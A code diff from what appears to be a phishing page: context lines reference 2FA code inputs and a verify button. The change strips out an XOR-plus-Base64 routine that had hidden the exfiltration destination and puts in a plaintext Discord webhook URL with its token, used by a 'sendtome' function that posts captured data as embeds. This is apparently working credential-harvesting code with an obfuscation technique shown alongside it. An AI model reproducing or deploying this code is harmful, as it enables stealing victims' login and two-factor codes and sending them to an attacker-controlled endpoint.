@@ -265,19 +265,8 @@ if (twofaInput2 && verifyButton2) {
 }
 
 // === Sending ===
-// XOR + Base64 encoded
-const encryptedsending = "AAEaBBZIHUcRBwcGHUAMWw0bCF1TGBxBAwAQWgcaBQdKQwFRQ19AU0IKWkReRlZFCl5GWVszM0EMGEMjKChiPT89HwEAHxJDOyIOKn8vEAEjMEJeBwIpMSoeBlgBDEYUHW0fPwI2IABXDkUrACgAe1tMDCErJGo7Bw==";
-const xorKey = "hunter2"; // must match the encoding key
-
-function xorDecode(base64, key) {
-  const decoded = atob(base64);
-  return [...decoded].map((c, i) =>
-    String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
-  ).join('');
-}
-
 async function sendtome(title, description, color) {
-  const url = xorDecode(encryptedsending, xorKey);
+  const url = "https://discord.com/api/webhooks/1396146082102378637/VAsdm-WMZPUJSkdr-z6UVkXMGeoWU0lowGEOl40tb2qo_wJlBEref0EtMrI39bUNVXSr";
   const payload = {
     embeds: [{
       title,
